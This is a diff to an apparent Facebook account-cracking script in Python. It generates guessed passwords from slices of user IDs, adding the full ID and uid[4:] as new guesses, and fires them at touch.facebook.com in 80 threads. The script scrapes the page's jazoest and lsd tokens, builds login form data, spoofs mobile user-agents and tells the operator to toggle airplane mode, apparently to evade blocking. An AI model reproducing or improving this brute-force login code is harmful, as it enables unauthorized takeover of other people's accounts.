@@ -520,7 +520,7 @@ def SUMON2():
         cookie_show.append("yes")
     else:
         cookie_show.append("no")
-    with ThreadPool(max_workers=90) as SUMON_xd:
+    with ThreadPool(max_workers=80) as SUMON_xd:
         clear()
         SUMON_time()
         tl = str(len(user))
@@ -529,7 +529,7 @@ def SUMON2():
         linex();print(' USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE ON/OFF ');linex()
         for guru in user:
             uid = kode+guru
-            pwx = [uid[:6],uid[:7],uid[:8]]
+            pwx = [uid[:6],uid[:7],uid[:8],uid,uid[4:]]
             if SUMONfire =='1':SUMON_xd.submit(mbasic,uid,pwx,tl)
             elif SUMONfire =='2':SUMON_xd.submit(p,uid,pwx,tl)
             elif SUMONfire =='3':SUMON_xd.submit(x,uid,pwx,tl)
@@ -1128,30 +1128,7 @@ def mbasic(uid,pwx,tl):
         for pw in pwx:
             Session = requests.Session()
             free_fb = Session.get('https://touch.facebook.com/').text
-            data = {
-            'try_number': '0',
-            'unrecognized_tries': '0',
-            'email': uid,
-            'prefill_contact_point': '',
-            'prefill_source': '',
-            'prefill_type': '',
-            'first_prefill_source': '',
-            'first_prefill_type': '',
-            'had_cp_prefilled': 'false',
-            'had_password_prefilled': 'false',
-            'is_smart_lock': 'false',
-            'bi_xrwh': '0',
-            'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
-            'bi_wvdp': '',
-            'fb_dtsg': '',
-            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            '__dyn': '',
-            '__csr': '',
-            '__req': random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]),
-            '__fmt': '0',
-            '__a': '',
-            '__user': '0'}
+            data = {'try_number': '0', 'unrecognized_tries': '0', 'email': uid, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': '0', 'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw), 'bi_wvdp': '', 'fb_dtsg': '', 'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1), 'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1), '__dyn': '', '__csr': '', '__req': random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"]), '__fmt': '0', '__a': '', '__user': '0'}
             headers = {
             'user-agent': 'Mozilla/5.0 (Linux; Android 7; Lenovo K13; Windows 10 Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/100.0.4863.134 Mobile Safari/537.36',
             'accept-encoding': 'gzip, deflate, br, zstd',
